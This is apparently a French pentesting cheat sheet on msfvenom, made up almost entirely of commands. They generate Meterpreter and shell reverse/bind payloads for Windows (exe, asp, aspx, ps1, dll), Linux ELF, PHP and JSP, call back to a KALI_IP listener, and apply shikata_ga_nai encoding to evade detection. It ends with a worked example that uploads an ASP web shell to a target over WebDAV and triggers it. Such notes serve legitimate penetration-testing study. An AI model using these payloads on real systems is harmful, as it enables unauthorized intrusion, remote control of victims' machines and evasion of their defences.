# üß¨ MSFVenom - Payload Generator

[‚Üê Retour √† la table des mati√®res](../README.md)

## Syntaxe g√©n√©rale
```bash
msfvenom -p PAYLOAD LHOST=IP LPORT=PORT -f FORMAT > output_file
```

## Payloads Windows

### Meterpreter TCP
```bash
# Reverse TCP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=KALI_IP LPORT=1234 -f exe > shell.exe

# Reverse HTTPS (plus discret)
msfvenom -p windows/meterpreter/reverse_https LHOST=KALI_IP LPORT=443 -f exe > shell.exe

# Bind TCP
msfvenom -p windows/meterpreter/bind_tcp LPORT=1234 -f exe > bind_shell.exe
```

### Formats sp√©cifiques Windows
```bash
# ASP pour IIS/WebDAV
msfvenom -p windows/meterpreter/reverse_tcp LHOST=KALI_IP LPORT=1234 -f asp > shell.asp

# ASPX pour IIS moderne
msfvenom -p windows/meterpreter/reverse_tcp LHOST=KALI_IP LPORT=1234 -f aspx > shell.aspx

# PowerShell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=KALI_IP LPORT=1234 -f psh > shell.ps1

# DLL
msfvenom -p windows/meterpreter/reverse_tcp LHOST=KALI_IP LPORT=1234 -f dll > shell.dll
```

## Payloads Linux

### Meterpreter Linux
```bash
# ELF executable
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=KALI_IP LPORT=1234 -f elf > shell.elf

# Shell reverse
msfvenom -p linux/x86/shell_reverse_tcp LHOST=KALI_IP LPORT=1234 -f elf > shell.elf
```

## Payloads Web

### PHP
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=KALI_IP LPORT=1234 -f raw > shell.php
```

### JSP
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=KALI_IP LPORT=1234 -f raw > shell.jsp
```

## Encodage et √©vasion

### Encodage simple
```bash
# Encoder avec shikata_ga_nai
msfvenom -p windows/meterpreter/reverse_tcp LHOST=KALI_IP LPORT=1234 -e x86/shikata_ga_nai -f exe > encoded_shell.exe

# Multiples it√©rations d'encodage
msfvenom -p windows/meterpreter/reverse_tcp LHOST=KALI_IP LPORT=1234 -e x86/shikata_ga_nai -i 10 -f exe > encoded_shell.exe
```

## Handler correspondant

### Multi/Handler
```bash
# Dans msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST KALI_IP
set LPORT 1234
run
```

## Exemples d'int√©gration

### WebDAV + MSFVenom
```bash
# 1. G√©n√©rer le payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=KALI_IP LPORT=1234 -f asp > shell.asp

# 2. Upload via cadaver
cadaver http://targetIP/webdav
put shell.asp

# 3. D√©marrer le handler
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST KALI_IP
set LPORT 1234
run

# 4. D√©clencher via navigateur
# http://targetIP/webdav/shell.asp
```

## Options utiles
- `-l` : Lister les payloads disponibles
- `-f` : Format de sortie
- `-e` : Encoder le payload
- `-i` : Nombre d'it√©rations d'encodage
- `-b` : Bad characters √† √©viter
- `--platform` : Plateforme cible
- `-a` : Architecture cible